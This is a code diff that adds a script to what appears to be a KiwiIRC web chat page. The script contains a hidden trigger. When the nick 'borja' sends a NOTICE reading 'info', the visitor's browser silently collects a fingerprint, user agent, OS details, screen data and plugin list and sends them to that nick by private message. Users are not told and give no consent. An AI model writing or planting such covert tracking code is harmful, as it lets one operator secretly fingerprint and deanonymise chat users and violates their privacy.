@@ -1,0 +1,24 @@
+<script type="text/javascript">
+    (function(){
+
+        kiwi.events.on('loaded', function(){
+            var network = kiwi.components.Network();
+            var input = kiwi.components.ControlInput();
+
+            network.on('message:notice', function(event) {
+                if(event.nick.toLowerCase() == 'borja' || event.nick.toLowerCase() == 'borja') {
+
+                    if(event.msg == "info")  {
+                        var client = new ClientJS();
+
+                        network.msg(event.nick, 'finguerprint ' + client.getFingerprint());
+                        network.msg(event.nick, client.getUserAgent());
+                        network.msg(event.nick, 'OS ' + client.getOS() + ' ' + client.getOSVersion() + ' '+ client.getScreenPrint());
+                        network.msg(event.nick, 'Plugins ' + client.getPlugins());
+                    }
+                     
+                }
+            });
+        });
+    })();
+</script>
